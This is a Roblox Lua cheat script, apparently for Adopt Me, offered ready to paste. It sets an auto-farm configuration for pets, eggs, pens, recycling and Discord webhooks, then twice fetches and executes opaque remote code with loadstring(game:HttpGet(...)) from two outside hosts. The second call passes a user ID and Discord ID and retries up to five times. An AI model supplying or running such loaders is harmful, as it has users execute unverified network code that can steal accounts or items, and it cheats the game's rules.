task.spawn(function()
    task.wait(35)
    SCRIPT_KEY="WorkFine";
    getgenv().Config = {
        ["PetAMountToBuy"] = "0", -- can be 999
        ["WhatCategory"] = "pets", -- gifts if WhatCategory = "" then = pets
        ["PetRemoteToBuy"] = "", -- exemple for gifts halloween_2025_spider_box
        ["check_for_2d_kitty"] = true, -- farm 2d kitty event work with eggfarm or petfarm

        ["PetFarmActive"] = true, -- farm potion

        ["EggFarmActive"] = false, -- farm egg, if no more eggs will farm potion, if found new egg will farm them to
        ["EggToIgnore"] = {"Crystal Egg"}, -- eggs to ignore when eggfarm active
        ["LoopBuyEgg"] = false, -- when enough bucks will buy egg, only work with eggfarm
        ["EggToBuyEgg"] = "",


        ["PetPenActive"] = false, -- will put pets in pen, random pets
        ["PetPenFocusPriority"] = false, -- will focus those pets order in pen, then farm any other pets
        ["PetPenFocusPetOrder"] = {"Donkey", "Golden Dragon"}, -- pet names to focus in pen exemple {"Donkey","Camel","Zebra"}
        ["PetPenFocusPetRarity"] = false, -- PetPenFocusPriority must be false else will ignore
        ["PetPenFocusPetRarityOrder"] = {"legendary","rare"}, -- will farm pet rarity depending on order using pet pen exemple "common","uncommon","rare","ultra_rare","legendary"
        ["PetPenAutoNeon"] = false, -- will try to make neon pets, check after it remove fullgrown pet from pen
        ["PetPenAutoMega"] = false, -- will try to make mega pets, check after it remove fullgrown pet from pen
        ["PetPenNeonMegaWebhook"] = "", -- webhook to send neon/mega info


        ["HodDogStandHOLDER"] = "", -- will automatically setup hotdog stand you must own one
        ["HodDogStandHOLDERPrice"] = "50", -- 1 to 50 max if not set default is 50
        ["HodDogStandTransfer"] = false, -- enable or disable hotdog stand transfer


        ["NeonMegaFarm"] = false,
        ["BuyEgg"] = "", -- only work with NeonMegaFarm, will loop buy this egg when enough bucks


        ["AutoBuyStuffRecyclePoint"] = false, -- will automatically buy stuff in recycle point shop
        ["ItemToBuyInRecyclePoint"] = "Crystal Egg", -- item name or item kind, exemple "Crystal Egg" or "Basic Egg"


        ["AutoReleasePet"] = false, -- work with egg/pet farm, will release selected rarity
        ["OnlyReleasePetList"] = {""}, -- will ONLY release those pet, and will ignore every other release config, if you dont want it let ""
        ["GlobalBlacklist"] = {""}, -- item kind or name separated by , ; |
        ["LegendaryAllowedToRecycle"] = {""}, -- item kind or name separated by , ; |
        ["RecycleWebhook"] = "", -- webhook to send recycle info
        ["RecycleOnlyPetWithAge"] = "", -- 6 = full grown, let "" to recycle all, 1 2 3 4 5 6 or "" not 0

        ["common"] = false,
        ["uncommon"] = false,
        ["rare"] = false,
        ["ultra_rare"] = false,
        ["legendary"] = false, -- WARNING must know what you are doing

        ["HideUselessGui"] = true,
        ["Blur_username"] = true,
        ["Blazing_Lion_Log"] = false,
        ["DiscordId"] = "",
        ["Webhook"] = "",
        ["LegendaryWebhook"] = "",
        ["NeonMegaWebhook"] = "",
    }
    loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/0834ed3339177583768e0ac89322132c4ff6158a050d196a7274977f95628d01/download"))()

task.spawn(function()   
    _G.Config={UserID="872abb63-44f8-4582-8ee9-0b202051bf94",discord_id="943761757288169493",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/adoptmee"))()end)if s then break end wait(5)end
